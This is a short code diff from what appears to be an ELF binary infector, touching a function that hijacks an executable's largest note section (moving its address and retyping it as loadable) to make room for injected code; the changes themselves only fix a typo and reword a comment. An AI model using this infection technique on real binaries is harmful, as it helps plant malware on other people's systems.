@@ -204,7 +204,7 @@ bool inf_note_patch(infect_t *inf) {
     ASSERT_CON_RET_FALSE(inf->elfo);
 
     /**
-     * Find out isf we have enough space for infection
+     * Find out if we have enough space for infection
      * in one of SHT_NOTE sections, if any
      */
     elf_shdr_t *sht_note = _inf_get_largest_note(inf);
@@ -229,7 +229,9 @@ bool inf_note_patch(infect_t *inf) {
     int ph_note_idx = inf->elfo->phmap[LAZY_PT_NOTE].map[0];
     elf_phdr_t *phdr = inf->elfo->phdrs[ph_note_idx];
 
-    /** Move sht virtual address way ahead so it won't hit others */
+    /** Move virtual address way ahead so
+     * it won't hit others, hopefully!
+     */
     sht_note->sh_addr = sht_note->sh_offset + 0x400000;
 
     sht_note->sh_type = SHT_PROGBITS;
